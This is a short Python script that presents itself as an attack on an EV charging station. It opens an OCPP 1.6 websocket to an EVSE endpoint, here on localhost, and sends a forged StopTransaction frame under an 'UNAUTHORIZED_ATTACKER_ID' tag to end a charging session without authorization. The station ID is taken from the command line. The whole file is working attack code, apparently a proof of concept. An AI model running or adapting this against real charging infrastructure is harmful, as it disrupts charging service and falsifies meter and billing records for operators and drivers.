import asyncio
import websockets
import json
import sys

async def launch_unauthorized_stop_attack(station_id="EVSE-ALPHA-01"):
    uri = f"ws://127.0.0.1:8000/ws/ocpp/{station_id}"
    print(f"[+] Connecting to live EVSE endpoint: {uri}")

    try:
        async with websockets.connect(uri, subprotocols=['ocpp1.6']) as ws:
            print("[+] Connection established.")
            
            # Craft unauthorized StopTransaction call
            payload = [
                2,
                "msg-9901",
                "StopTransaction",
                {
                    "transactionId": 8842,
                    "idTag": "UNAUTHORIZED_ATTACKER_ID",
                    "meterStop": 15000,
                    "timestamp": "2026-08-04T20:20:00Z"
                }
            ]
            
            print("[!] Transmitting malicious StopTransaction frame over TCP socket...")
            await ws.send(json.dumps(payload))
            
            # Keep connection open briefly to verify packet delivery
            await asyncio.sleep(2)
            print("[+] Attack frame sent successfully.")

    except Exception as e:
        print(f"[-] Connection failed: {e}")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "EVSE-ALPHA-01"
    asyncio.run(launch_unauthorized_stop_attack(target))